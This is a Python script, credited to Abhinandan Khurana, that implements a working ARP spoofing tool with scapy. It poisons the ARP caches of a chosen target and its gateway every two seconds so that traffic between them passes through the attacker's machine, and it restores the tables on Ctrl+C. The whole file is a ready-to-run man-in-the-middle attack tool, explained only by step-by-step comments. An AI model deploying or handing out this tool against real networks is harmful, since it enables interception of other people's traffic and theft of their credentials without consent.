'''
                                                                                       .-----.        .-----.                                       
                                                                                      '   _    \     '   _    \                                     
                _________   _...._                         _________   _...._       /   /` '.   \  /   /` '.   \             __.....__              
                \        |.'      '-.                      \        |.'      '-.   .   |     \  ' .   |     \  '   _.._  .-''         '.            
          .-,.--.\        .'```'.    '.                     \        .'```'.    '. |   '      |  '|   '      |  '.' .._|/     .-''"'-.  `. .-,.--.  
    __    |  .-. |\      |       \     \                     \      |       \     \\    \     / / \    \     / / | '   /     /________\   \|  .-. | 
 .:--.'.  | |  | | |     |        |    |                 _    |     |        |    | `.   ` ..' /   `.   ` ..' /__| |__ |                  || |  | | 
/ |   \ | | |  | | |      \      /    .                .' |   |      \      /    .     '-...-'`       '-...-'`|__   __|\    .-------------'| |  | | 
`" __ | | | |  '-  |     |\`'-.-'   .'                .   | / |     |\`'-.-'   .'                                | |    \    '-.____...---.| |  '-  
 .'.''| | | |      |     | '-....-'`                .'.'| |// |     | '-....-'`                                  | |     `.             .' | |      
/ /   | |_| |     .'     '.                       .'.'.-'  / .'     '.                                           | |       `''-...... -'   | |      
\ \._,\ '/|_|   '-----------'                     .'   \_.''-----------'                                         | |                       |_|      
 `--'  `"                                                                                                        |_|                                

~ Abhinandan Khurana

'''




import scapy.all as scapy
import time
import optparse


def arguments_func():
	parser = optparse.OptionParser()
	parser.add_option("-t","--target-ip",dest="target_ip",help="Target IP address")
	parser.add_option("-g","--gateway-ip",dest="gateway_ip",help="Gateway IP address")
	(options, arguments) = parser.parse_args()
	if not options.target_ip:
		parser.error("\033[1;31m [-] Please specify a target IP address, use --help for more info")
	elif not options.gateway_ip:
		parser.error("\033[1;31m [-] Please specify a gateway IP Address, use --help for more info")
	else:
		return options

def get_mac_address(ip):
	# ARP request generation
	arp_request = scapy.ARP(pdst=ip)
	# Ethernet frame generation for ARP broadcast to src MAC address
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	# Combined the two frames for easily sending the packet
	arp_request_broadcast = broadcast/arp_request
	# Send the packet and get the response (remember the response is in the form of a list, and those are 2 specifically - answered and unanswered ), we need to get the first element of the list so we used answered[0]
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	#----------------------------------
	# return answered_list[0][1].hwsrc	(Alternate method below)
	#----------------------------------
	client_list = []
	for element in answered_list:
		client_mac = element[1].hwsrc
		client_list.append(client_mac)
	return client_list


def spoof(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    # create a packet
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # send the packet
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac_address(destination_ip)
	source_mac = get_mac_address(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet,count = 4,  verbose=False)
	

sent_packets_count = 0

(options) = arguments_func()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
	while True:
		# Spoof the target (for gateway)
		spoof(target_ip,gateway_ip)
		# Spoof the gateway (for target)
		spoof(gateway_ip,target_ip)
		sent_packets_count+=2
		print(f"\r\033[1;32m [+] Packets sent {str(sent_packets_count)}" , end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n \033[1;31m [-] Detected CTRL + C ..... \033[1;33m [+] Resetting ARP Table....Please Wait!\n")
	# Restore the target (for gateway)
	restore(target_ip,gateway_ip)
	# Restore the gateway (for target)
	restore(gateway_ip,target_ip)
	print("\033[1;32m [+] ARP Table Reset Successfully!\n")